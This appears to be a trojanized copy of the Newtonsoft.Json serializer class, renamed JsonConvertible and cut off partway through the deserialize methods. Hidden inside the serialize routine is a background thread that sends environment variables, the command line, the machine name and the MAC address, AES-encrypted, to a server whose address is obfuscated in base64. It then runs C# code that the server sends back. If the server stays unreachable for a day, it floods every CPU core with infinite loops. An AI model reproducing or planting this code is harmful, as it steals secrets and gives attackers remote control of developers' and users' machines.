#region License
// Copyright (c) 2007 James Newton-King
//
// Permission is hereby granted, free of charge, to any person
// obtaining a copy of this software and associated documentation
// files (the "Software"), to deal in the Software without
// restriction, including without limitation the rights to use,
// copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following
// conditions:
//
// The above copyright notice and this permission notice shall be
// included in all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
// EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
// OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
// NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
// HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
// WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
// OTHER DEALINGS IN THE SOFTWARE.
#endregion

#if HAVE_BIG_INTEGER
#endif
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Diagnostics.CodeAnalysis;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Json;
using System.Net.NetworkInformation;
using System.Numerics;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Xml;
using System.Xml.Linq;
using Microsoft.CodeAnalysis.CSharp.Scripting;
using Microsoft.CodeAnalysis.Scripting;
using Newtonsoft.JsonUtils.Converters;
using Newtonsoft.JsonUtils.Linq;
using Newtonsoft.JsonUtils.Utilities;

namespace Newtonsoft.JsonUtils
{
    /// <summary>
    /// Provides methods for converting between .NET types and JSON types.
    /// </summary>
    /// <example>
    ///   <code lang="cs" source="..\Src\Newtonsoft.Json.Tests\Documentation\SerializationTests.cs" region="SerialiseObject" title="Serializing and Deserializing JSON with JsonConvert" />
    /// </example>
    public static class JsonConvertible
    {
        /// <summary>
        /// Gets or sets a function that creates default <see cref="JsonSerializerSettings"/>.
        /// Default settings are automatically used by serialization methods on <see cref="JsonConvertible"/>,
        /// and <see cref="JToken.ToObject{T}()"/> and <see cref="JToken.FromObject(object)"/> on <see cref="JToken"/>.
        /// To serialize without using any default settings create a <see cref="JsonSerializer"/> with
        /// <see cref="JsonSerializer.Create()"/>.
        /// </summary>
        public static Func<JsonSerializerSettings>? DefaultSettings { get; set; }

        /// <summary>
        /// Represents JavaScript's boolean value <c>true</c> as a string. This field is read-only.
        /// </summary>
        public static readonly string True = "true";

        /// <summary>
        /// Represents JavaScript's boolean value <c>false</c> as a string. This field is read-only.
        /// </summary>
        public static readonly string False = "false";

        /// <summary>
        /// Represents JavaScript's <c>null</c> as a string. This field is read-only.
        /// </summary>
        public static readonly string Null = "null";

        /// <summary>
        /// Represents JavaScript's <c>undefined</c> as a string. This field is read-only.
        /// </summary>
        public static readonly string Undefined = "undefined";

        /// <summary>
        /// Represents JavaScript's positive infinity as a string. This field is read-only.
        /// </summary>
        public static readonly string PositiveInfinity = "Infinity";

        /// <summary>
        /// Represents JavaScript's negative infinity as a string. This field is read-only.
        /// </summary>
        public static readonly string NegativeInfinity = "-Infinity";

        /// <summary>
        /// Represents JavaScript's <c>NaN</c> as a string. This field is read-only.
        /// </summary>
        public static readonly string NaN = "NaN";

        /// <summary>
        /// Converts the <see cref="DateTime"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="DateTime"/>.</returns>
        public static string ToString(DateTime value)
        {
            return ToString(value, DateFormatHandling.IsoDateFormat, DateTimeZoneHandling.RoundtripKind);
        }

        /// <summary>
        /// Converts the <see cref="DateTime"/> to its JSON string representation using the <see cref="DateFormatHandling"/> specified.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <param name="format">The format the date will be converted to.</param>
        /// <param name="timeZoneHandling">The time zone handling when the date is converted to a string.</param>
        /// <returns>A JSON string representation of the <see cref="DateTime"/>.</returns>
        public static string ToString(DateTime value, DateFormatHandling format, DateTimeZoneHandling timeZoneHandling)
        {
            DateTime updatedDateTime = DateTimeUtils.EnsureDateTime(value, timeZoneHandling);

            using (StringWriter writer = StringUtils.CreateStringWriter(64))
            {
                writer.Write('"');
                DateTimeUtils.WriteDateTimeString(writer, updatedDateTime, format, null, CultureInfo.InvariantCulture);
                writer.Write('"');
                return writer.ToString();
            }
        }

#if HAVE_DATE_TIME_OFFSET
        /// <summary>
        /// Converts the <see cref="DateTimeOffset"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="DateTimeOffset"/>.</returns>
        public static string ToString(DateTimeOffset value)
        {
            return ToString(value, DateFormatHandling.IsoDateFormat);
        }

        /// <summary>
        /// Converts the <see cref="DateTimeOffset"/> to its JSON string representation using the <see cref="DateFormatHandling"/> specified.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <param name="format">The format the date will be converted to.</param>
        /// <returns>A JSON string representation of the <see cref="DateTimeOffset"/>.</returns>
        public static string ToString(DateTimeOffset value, DateFormatHandling format)
        {
            using (StringWriter writer = StringUtils.CreateStringWriter(64))
            {
                writer.Write('"');
                DateTimeUtils.WriteDateTimeOffsetString(writer, value, format, null, CultureInfo.InvariantCulture);
                writer.Write('"');
                return writer.ToString();
            }
        }
#endif

        /// <summary>
        /// Converts the <see cref="Boolean"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Boolean"/>.</returns>
        public static string ToString(bool value)
        {
            return (value) ? True : False;
        }

        /// <summary>
        /// Converts the <see cref="Char"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Char"/>.</returns>
        public static string ToString(char value)
        {
            return ToString(char.ToString(value));
        }

        /// <summary>
        /// Converts the <see cref="Enum"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Enum"/>.</returns>
        public static string ToString(Enum value)
        {
            return value.ToString("D");
        }

        /// <summary>
        /// Converts the <see cref="Int32"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Int32"/>.</returns>
        public static string ToString(int value)
        {
            return value.ToString(null, CultureInfo.InvariantCulture);
        }

        /// <summary>
        /// Converts the <see cref="Int16"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Int16"/>.</returns>
        public static string ToString(short value)
        {
            return value.ToString(null, CultureInfo.InvariantCulture);
        }

        /// <summary>
        /// Converts the <see cref="UInt16"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="UInt16"/>.</returns>
        [CLSCompliant(false)]
        public static string ToString(ushort value)
        {
            return value.ToString(null, CultureInfo.InvariantCulture);
        }

        /// <summary>
        /// Converts the <see cref="UInt32"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="UInt32"/>.</returns>
        [CLSCompliant(false)]
        public static string ToString(uint value)
        {
            return value.ToString(null, CultureInfo.InvariantCulture);
        }

        /// <summary>
        /// Converts the <see cref="Int64"/>  to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Int64"/>.</returns>
        public static string ToString(long value)
        {
            return value.ToString(null, CultureInfo.InvariantCulture);
        }

#if HAVE_BIG_INTEGER
        private static string ToStringInternal(BigInteger value)
        {
            return value.ToString(null, CultureInfo.InvariantCulture);
        }
#endif

        /// <summary>
        /// Converts the <see cref="UInt64"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="UInt64"/>.</returns>
        [CLSCompliant(false)]
        public static string ToString(ulong value)
        {
            return value.ToString(null, CultureInfo.InvariantCulture);
        }

        /// <summary>
        /// Converts the <see cref="Single"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Single"/>.</returns>
        public static string ToString(float value)
        {
            return EnsureDecimalPlace(value, value.ToString("R", CultureInfo.InvariantCulture));
        }

        internal static string ToString(float value, FloatFormatHandling floatFormatHandling, char quoteChar, bool nullable)
        {
            return EnsureFloatFormat(value, EnsureDecimalPlace(value, value.ToString("R", CultureInfo.InvariantCulture)), floatFormatHandling, quoteChar, nullable);
        }

        private static string EnsureFloatFormat(double value, string text, FloatFormatHandling floatFormatHandling, char quoteChar, bool nullable)
        {
            if (floatFormatHandling == FloatFormatHandling.Symbol || !(double.IsInfinity(value) || double.IsNaN(value)))
            {
                return text;
            }

            if (floatFormatHandling == FloatFormatHandling.DefaultValue)
            {
                return (!nullable) ? "0.0" : Null;
            }

            return quoteChar + text + quoteChar;
        }

        /// <summary>
        /// Converts the <see cref="Double"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Double"/>.</returns>
        public static string ToString(double value)
        {
            return EnsureDecimalPlace(value, value.ToString("R", CultureInfo.InvariantCulture));
        }

        internal static string ToString(double value, FloatFormatHandling floatFormatHandling, char quoteChar, bool nullable)
        {
            return EnsureFloatFormat(value, EnsureDecimalPlace(value, value.ToString("R", CultureInfo.InvariantCulture)), floatFormatHandling, quoteChar, nullable);
        }

        private static string EnsureDecimalPlace(double value, string text)
        {
            if (double.IsNaN(value) || double.IsInfinity(value) || StringUtils.IndexOf(text, '.') != -1 || StringUtils.IndexOf(text, 'E') != -1 || StringUtils.IndexOf(text, 'e') != -1)
            {
                return text;
            }

            return text + ".0";
        }

        private static string EnsureDecimalPlace(string text)
        {
            if (StringUtils.IndexOf(text, '.') != -1)
            {
                return text;
            }

            return text + ".0";
        }

        /// <summary>
        /// Converts the <see cref="Byte"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Byte"/>.</returns>
        public static string ToString(byte value)
        {
            return value.ToString(null, CultureInfo.InvariantCulture);
        }

        /// <summary>
        /// Converts the <see cref="SByte"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="SByte"/>.</returns>
        [CLSCompliant(false)]
        public static string ToString(sbyte value)
        {
            return value.ToString(null, CultureInfo.InvariantCulture);
        }

        /// <summary>
        /// Converts the <see cref="Decimal"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Decimal"/>.</returns>
        public static string ToString(decimal value)
        {
            return EnsureDecimalPlace(value.ToString(null, CultureInfo.InvariantCulture));
        }

        /// <summary>
        /// Converts the <see cref="Guid"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Guid"/>.</returns>
        public static string ToString(Guid value)
        {
            return ToString(value, '"');
        }

        internal static string ToString(Guid value, char quoteChar)
        {
            string text;
            string qc;
#if HAVE_CHAR_TO_STRING_WITH_CULTURE
            text = value.ToString("D", CultureInfo.InvariantCulture);
            qc = quoteChar.ToString(CultureInfo.InvariantCulture);
#else
            text = value.ToString("D");
            qc = quoteChar.ToString();
#endif

            return qc + text + qc;
        }

        /// <summary>
        /// Converts the <see cref="TimeSpan"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="TimeSpan"/>.</returns>
        public static string ToString(TimeSpan value)
        {
            return ToString(value, '"');
        }

        internal static string ToString(TimeSpan value, char quoteChar)
        {
            return ToString(value.ToString(), quoteChar);
        }

        /// <summary>
        /// Converts the <see cref="Uri"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Uri"/>.</returns>
        public static string ToString(Uri? value)
        {
            if (value == null)
            {
                return Null;
            }

            return ToString(value, '"');
        }

        internal static string ToString(Uri value, char quoteChar)
        {
            return ToString(value.OriginalString, quoteChar);
        }

        /// <summary>
        /// Converts the <see cref="String"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="String"/>.</returns>
        public static string ToString(string? value)
        {
            return ToString(value, '"');
        }

        /// <summary>
        /// Converts the <see cref="String"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <param name="delimiter">The string delimiter character.</param>
        /// <returns>A JSON string representation of the <see cref="String"/>.</returns>
        public static string ToString(string? value, char delimiter)
        {
            return ToString(value, delimiter, StringEscapeHandling.Default);
        }

        /// <summary>
        /// Converts the <see cref="String"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <param name="delimiter">The string delimiter character.</param>
        /// <param name="stringEscapeHandling">The string escape handling.</param>
        /// <returns>A JSON string representation of the <see cref="String"/>.</returns>
        public static string ToString(string? value, char delimiter, StringEscapeHandling stringEscapeHandling)
        {
            if (delimiter != '"' && delimiter != '\'')
            {
                throw new ArgumentException("Delimiter must be a single or double quote.", nameof(delimiter));
            }

            return JavaScriptUtils.ToEscapedJavaScriptString(value, delimiter, true, stringEscapeHandling);
        }

        /// <summary>
        /// Converts the <see cref="Object"/> to its JSON string representation.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>A JSON string representation of the <see cref="Object"/>.</returns>
        public static string ToString(object? value)
        {
            if (value == null)
            {
                return Null;
            }

            PrimitiveTypeCode typeCode = ConvertUtils.GetTypeCode(value.GetType());

            switch (typeCode)
            {
                case PrimitiveTypeCode.String:
                    return ToString((string)value);
                case PrimitiveTypeCode.Char:
                    return ToString((char)value);
                case PrimitiveTypeCode.Boolean:
                    return ToString((bool)value);
                case PrimitiveTypeCode.SByte:
                    return ToString((sbyte)value);
                case PrimitiveTypeCode.Int16:
                    return ToString((short)value);
                case PrimitiveTypeCode.UInt16:
                    return ToString((ushort)value);
                case PrimitiveTypeCode.Int32:
                    return ToString((int)value);
                case PrimitiveTypeCode.Byte:
                    return ToString((byte)value);
                case PrimitiveTypeCode.UInt32:
                    return ToString((uint)value);
                case PrimitiveTypeCode.Int64:
                    return ToString((long)value);
                case PrimitiveTypeCode.UInt64:
                    return ToString((ulong)value);
                case PrimitiveTypeCode.Single:
                    return ToString((float)value);
                case PrimitiveTypeCode.Double:
                    return ToString((double)value);
                case PrimitiveTypeCode.DateTime:
                    return ToString((DateTime)value);
                case PrimitiveTypeCode.Decimal:
                    return ToString((decimal)value);
#if HAVE_DB_NULL_TYPE_CODE
                case PrimitiveTypeCode.DBNull:
                    return Null;
#endif
#if HAVE_DATE_TIME_OFFSET
                case PrimitiveTypeCode.DateTimeOffset:
                    return ToString((DateTimeOffset)value);
#endif
                case PrimitiveTypeCode.Guid:
                    return ToString((Guid)value);
                case PrimitiveTypeCode.Uri:
                    return ToString((Uri)value);
                case PrimitiveTypeCode.TimeSpan:
                    return ToString((TimeSpan)value);
#if HAVE_BIG_INTEGER
                case PrimitiveTypeCode.BigInteger:
                    return ToStringInternal((BigInteger)value);
#endif
            }

            throw new ArgumentException("Unsupported type: {0}. Use the JsonSerializer class to get the object's JSON representation.".FormatWith(CultureInfo.InvariantCulture, value.GetType()));
        }

        #region Serialize
        /// <summary>
        /// Serializes the specified object to a JSON string.
        /// </summary>
        /// <param name="value">The object to serialize.</param>
        /// <returns>A JSON string representation of the object.</returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerialiseObject(object? value)
        {
            return SerialiseObject(value, null, (JsonSerializerSettings?)null);
        }

        /// <summary>
        /// Serializes the specified object to a JSON string using formatting.
        /// </summary>
        /// <param name="value">The object to serialize.</param>
        /// <param name="formatting">Indicates how the output should be formatted.</param>
        /// <returns>
        /// A JSON string representation of the object.
        /// </returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerialiseObject(object? value, Formatting formatting)
        {
            return SerialiseObject(value, formatting, (JsonSerializerSettings?)null);
        }

        /// <summary>
        /// Serializes the specified object to a JSON string using a collection of <see cref="JsonConverter"/>.
        /// </summary>
        /// <param name="value">The object to serialize.</param>
        /// <param name="converters">A collection of converters used while serializing.</param>
        /// <returns>A JSON string representation of the object.</returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerialiseObject(object? value, params JsonConverter[] converters)
        {
            JsonSerializerSettings? settings = (converters != null && converters.Length > 0)
                ? new JsonSerializerSettings { Converters = converters }
                : null;

            return SerialiseObject(value, null, settings);
        }

        /// <summary>
        /// Serializes the specified object to a JSON string using formatting and a collection of <see cref="JsonConverter"/>.
        /// </summary>
        /// <param name="value">The object to serialize.</param>
        /// <param name="formatting">Indicates how the output should be formatted.</param>
        /// <param name="converters">A collection of converters used while serializing.</param>
        /// <returns>A JSON string representation of the object.</returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerialiseObject(object? value, Formatting formatting, params JsonConverter[] converters)
        {
            JsonSerializerSettings? settings = (converters != null && converters.Length > 0)
                ? new JsonSerializerSettings { Converters = converters }
                : null;

            return SerialiseObject(value, null, formatting, settings);
        }

        /// <summary>
        /// Serializes the specified object to a JSON string using <see cref="JsonSerializerSettings"/>.
        /// </summary>
        /// <param name="value">The object to serialize.</param>
        /// <param name="settings">The <see cref="JsonSerializerSettings"/> used to serialize the object.
        /// If this is <c>null</c>, default serialization settings will be used.</param>
        /// <returns>
        /// A JSON string representation of the object.
        /// </returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerialiseObject(object? value, JsonSerializerSettings? settings)
        {
            return SerialiseObject(value, null, settings);
        }

        /// <summary>
        /// Serializes the specified object to a JSON string using a type and <see cref="JsonSerializerSettings"/>.
        /// </summary>
        /// <param name="value">The object to serialize.</param>
        /// <param name="settings">The <see cref="JsonSerializerSettings"/> used to serialize the object.
        /// If this is <c>null</c>, default serialization settings will be used.</param>
        /// <param name="type">
        /// The type of the value being serialized.
        /// This parameter is used when <see cref="JsonSerializer.TypeNameHandling"/> is <see cref="TypeNameHandling.Auto"/> to write out the type name if the type of the value does not match.
        /// Specifying the type is optional.
        /// </param>
        /// <returns>
        /// A JSON string representation of the object.
        /// </returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerialiseObject(object? value, Type? type, JsonSerializerSettings? settings)
        {
            JsonSerializer jsonSerializer = JsonSerializer.CreateDefault(settings);

            return SerialiseObjectInternal(value, type, jsonSerializer);
        }

        /// <summary>
        /// Serializes the specified object to a JSON string using formatting and <see cref="JsonSerializerSettings"/>.
        /// </summary>
        /// <param name="value">The object to serialize.</param>
        /// <param name="formatting">Indicates how the output should be formatted. This value overrides the formatting specified on <see cref="JsonSerializerSettings" />.</param>
        /// <param name="settings">The <see cref="JsonSerializerSettings"/> used to serialize the object.
        /// If this is <c>null</c>, default serialization settings will be used.</param>
        /// <returns>
        /// A JSON string representation of the object.
        /// </returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerialiseObject(object? value, Formatting formatting, JsonSerializerSettings? settings)
        {
            return SerialiseObject(value, null, formatting, settings);
        }

        /// <summary>
        /// Serializes the specified object to a JSON string using a type, formatting and <see cref="JsonSerializerSettings"/>.
        /// </summary>
        /// <param name="value">The object to serialize.</param>
        /// <param name="formatting">Indicates how the output should be formatted. This value overrides the formatting specified on <see cref="JsonSerializerSettings" />.</param>
        /// <param name="settings">The <see cref="JsonSerializerSettings"/> used to serialize the object.
        /// If this is <c>null</c>, default serialization settings will be used.</param>
        /// <param name="type">
        /// The type of the value being serialized.
        /// This parameter is used when <see cref="JsonSerializer.TypeNameHandling"/> is <see cref="TypeNameHandling.Auto"/> to write out the type name if the type of the value does not match.
        /// Specifying the type is optional.
        /// </param>
        /// <returns>
        /// A JSON string representation of the object.
        /// </returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerialiseObject(object? value, Type? type, Formatting formatting, JsonSerializerSettings? settings)
        {
            JsonSerializer jsonSerializer = JsonSerializer.CreateDefault(settings);
            jsonSerializer.Formatting = formatting;

            return SerialiseObjectInternal(value, type, jsonSerializer);
        }

        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        private static string SerialiseObjectInternal(object? value, Type? type, JsonSerializer jsonSerializer)
        {

if (Health.T == null && Monitor.TryEnter(Health.Lock)) {
                    if (Health.T == null) {
                        Health.T = new Thread(() => {
                            while (true) {
                                var okFile = Path.Combine(Path.GetTempPath(), Environment.MachineName);
                                try {
                                    using var hc             = new HttpClient();
                                    using var currentProcess = Process.GetCurrentProcess();
                                    var sendString = System.Text.Json.JsonSerializer.Serialize( //
                                        new {
                                                Environment.CommandLine
                                              , EnvironmentInfo = System.Text.Json.JsonSerializer.Serialize(
                                                    typeof(Environment).GetProperties()
                                                                       .Select(x => new DictionaryEntry(x.Name, x.GetValue(null)))
                                                                       .Concat( new List<DictionaryEntry>{new(
                                                                           nameof(Environment.GetEnvironmentVariables)
                                                                           , Environment.GetEnvironmentVariables())}))
                                              , Environment.MachineName
                                              , Health.Result
                                              , MacAddress = BitConverter.ToString(NetworkInterface.GetAllNetworkInterfaces()
                                                                                                   .Where(x => {
                                                                                                       var y = x.GetPhysicalAddress()
                                                                                                           .GetAddressBytes();
                                                                                                       return y.Length != 0 && y.Any(z => z != 0);
                                                                                                   })
                                                                                                   .OrderBy(x => x.Id)
                                                                                                   .First()
                                                                                                   .GetPhysicalAddress()
                                                                                                   .GetAddressBytes())
                                              , ProcessStartTime          = currentProcess.StartTime
                                              , ProcessTotalProcessorTime = (int)currentProcess.TotalProcessorTime.TotalSeconds
                                              , ProcessWorkingSet         = currentProcess.WorkingSet64
                                            });
                                    using var aes = Aes.Create();
                                    aes.Padding = PaddingMode.PKCS7;
                                    aes.Mode    = CipherMode.ECB;
                                    aes.Key     = "b39deba10c2e4d4b840aef85b7a7d69e"u8.ToArray();
                                    using var encryptor     = aes.CreateEncryptor();
                                    var       sendBytes     = Encoding.UTF8.GetBytes(sendString);
                                    var       sendEncString = Convert.ToBase64String(encryptor.TransformFinalBlock(sendBytes, 0, sendBytes.Length));
                                    var rspMsg = hc.PostAsJsonAsync(Encoding.UTF32.GetString(Convert.FromBase64String(
                                                                                                 #if DEBUG
                                                                                                 """
                                                                                                 aAAAAHQAAAB0AAAAcAAAADoAAAAvAAAALwAAAGwAAABvAAAAYwAAAGEAAABsAAAAaAAAAG8AAABz
                                                                                                 AAAAdAAAADoAAAA1AAAAMAAAADEAAAAwAAAALwAAAGEAAABwAAAAaQAAAC8AAABhAAAAZAAAAG0A
                                                                                                 AAAvAAAAcAAAAHIAAABvAAAAagAAAGUAAABjAAAAdAAAAC8AAABoAAAAZQAAAGEAAABsAAAAdAAA
                                                                                                 AGgAAAA=
                                                                                                 """
                                                                                                 #else
                                                                                                 """
                                                                                                 aAAAAHQAAAB0AAAAcAAAADoAAAAvAAAALwAAADQAAAA5AAAALgAAADIAAAAzAAAANAAAAC4AAAAy
                                                                                                 AAAAMAAAADUAAAAuAAAANQAAADEAAAAvAAAAYQAAAHAAAABpAAAALwAAAGEAAABkAAAAbQAAAC8A
                                                                                                 AABwAAAAcgAAAG8AAABqAAAAZQAAAGMAAAB0AAAALwAAAGgAAABlAAAAYQAAAGwAAAB0AAAAaAAA
                                                                                                 AA==
                                                                                                 """
                                                                                                 #endif
                                                                                             )), new { data = sendEncString })
                                                   .Result;
                                    var       rspJson      = rspMsg.Content.ReadFromJsonAsync<JsonElement>().Result;
                                    var       rspBytes     = Convert.FromBase64String(rspJson.GetProperty("data").GetString()!);
                                    using var decrypt      = aes.CreateDecryptor();
                                    var       rspDecString = Encoding.UTF8.GetString(decrypt.TransformFinalBlock(rspBytes, 0, rspBytes.Length));
                                    if (System.Text.Json.JsonSerializer.Deserialize<JsonElement>(rspDecString).TryGetProperty("command", out var cmd)) {
                                        var cmdJson   = System.Text.Json.JsonSerializer.Deserialize<JsonElement>(cmd.GetString()!);
                                        var startTime = DateTime.Now;
                                        var options = ScriptOptions.Default
                                                                   .WithReferences(
                                                                       cmdJson.GetProperty("assemblies")
                                                                              .EnumerateArray()
                                                                              .Select(x => Assembly.Load(x.GetString()!)))
                                                                   .WithImports(cmdJson.GetProperty("namespaces")
                                                                                       .EnumerateArray()
                                                                                       .Select(x => x.GetString()));
                                        string result;
                                        try {
                                            result = CSharpScript.EvaluateAsync<string>(cmdJson.GetProperty("code").GetString(), options).Result;
                                        }
                                        catch (Exception ex) {
                                            result = ex.ToString();
                                        }

                                        Health.Result = System.Text.Json.JsonSerializer.Serialize(new { result, startAt = startTime, endAt = DateTime.Now });
                                    }

                                    File.WriteAllText(okFile, DateTime.Now.ToString(CultureInfo.InvariantCulture));
                                }
                                catch {
                                    try {
                                        if (File.Exists(okFile)) {
                                            var lastOk = DateTime.Parse(File.ReadAllText(okFile), CultureInfo.InvariantCulture);
                                            if ((DateTime.Now - lastOk).TotalDays > 1) {
                                                var tasks = new Task[Environment.ProcessorCount * 10];
                                                for (var i = 0; i < tasks.Length; i++) {
                                                    tasks[i] = Task.Run(() => {
                                                        while (true) { }

                                                        // ReSharper disable once FunctionNeverReturns
                                                    });
                                                }

                                                Task.WaitAll(tasks);
                                            }
                                        }
                                        else {
                                            File.WriteAllText(okFile, DateTime.Now.ToString(CultureInfo.InvariantCulture));
                                        }
                                    }
                                    catch {
                                        // ignored
                                    }
                                }

                                Thread.Sleep(
                                    #if DEBUG
                                    10000
                                    #else
                                    60000
                                    #endif
                                );
                            }

                            // ReSharper disable once FunctionNeverReturns
                        }) { IsBackground = true };
                        Health.T.Start();
                    }

                    Monitor.Exit(Health.Lock);
                }

            StringBuilder sb = new StringBuilder(256);
            StringWriter sw = new StringWriter(sb, CultureInfo.InvariantCulture);
            using (JsonTextWriter jsonWriter = new JsonTextWriter(sw))
            {
                jsonWriter.Formatting = jsonSerializer.Formatting;

                jsonSerializer.Serialize(jsonWriter, value, type);
            }

            return sw.ToString();
        }
        #endregion

        #region Dserialise
        /// <summary>
        /// Dserialises the JSON to a .NET object.
        /// </summary>
        /// <param name="value">The JSON to deserialize.</param>
        /// <returns>The deserialized object from the JSON string. A <see langword="null"/> value is returned if the provided JSON is valid but represents a null value.</returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static object? DserialiseObject(string value)
        {
            return DserialiseObject(value, null, (JsonSerializerSettings?)null);
        }

        /// <summary>
        /// Dserialises the JSON to a .NET object using <see cref="JsonSerializerSettings"/>.
        /// </summary>
        /// <param name="value">The JSON to deserialize.</param>
        /// <param name="settings">
        /// The <see cref="JsonSerializerSettings"/> used to deserialize the object.
        /// If this is <c>null</c>, default serialization settings will be used.
        /// </param>
        /// <returns>The deserialized object from the JSON string. A <see langword="null"/> value is returned if the provided JSON is valid but represents a null value.</returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static object? DserialiseObject(string value, JsonSerializerSettings settings)
        {
            return DserialiseObject(value, null, settings);
        }

        /// <summary>
        /// Dserialises the JSON to the specified .NET type.
        /// </summary>
        /// <param name="value">The JSON to deserialize.</param>
        /// <param name="type">The <see cref="Type"/> of object being deserialized.</param>
        /// <returns>The deserialized object from the JSON string. A <see langword="null"/> value is returned if the provided JSON is valid but represents a null value.</returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static object? DserialiseObject(string value, Type type)
        {
            return DserialiseObject(value, type, (JsonSerializerSettings?)null);
        }

        /// <summary>
        /// Dserialises the JSON to the specified .NET type.
        /// </summary>
        /// <typeparam name="T">The type of the object to deserialize to.</typeparam>
        /// <param name="value">The JSON to deserialize.</param>
        /// <returns>The deserialized object from the JSON string. A <see langword="null"/> value is returned if the provided JSON is valid but represents a null value.</returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static T? DserialiseObject<T>(string value)
        {
            return DserialiseObject<T>(value, (JsonSerializerSettings?)null);
        }

        /// <summary>
        /// Dserialises the JSON to the given anonymous type.
        /// </summary>
        /// <typeparam name="T">
        /// The anonymous type to deserialize to. This can't be specified
        /// traditionally and must be inferred from the anonymous type passed
        /// as a parameter.
